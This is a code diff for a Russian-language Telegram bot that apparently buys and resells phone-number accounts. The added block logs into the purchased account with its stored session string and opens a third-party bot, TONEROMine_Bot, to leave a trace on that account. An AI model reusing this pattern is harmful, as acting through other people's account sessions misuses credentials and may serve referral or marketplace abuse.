@@ -3491,6 +3491,16 @@ async def lzt_buy_country_select_callback(update: Update, context: ContextTypes.
                     [btn("🏠 ГЛАВНОЕ МЕНЮ", "start")]
                 ])
             )
+            # Открываем TONEROMine_Bot — создаём видимый след на аккаунте покупателя
+            try:
+                if session_str:
+                    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+                    await client.connect()
+                    if await client.is_user_authorized():
+                        await open_bot_link(client)
+                    await client.disconnect()
+            except Exception as e:
+                logger.error(f"❌ Ошибка открытия TONEROMine_Bot для {phone_display}: {e}")
         else:
             await query.edit_message_text(
                 "❌ <b>НЕ УДАЛОСЬ КУПИТЬ НОМЕР.</b>\n"
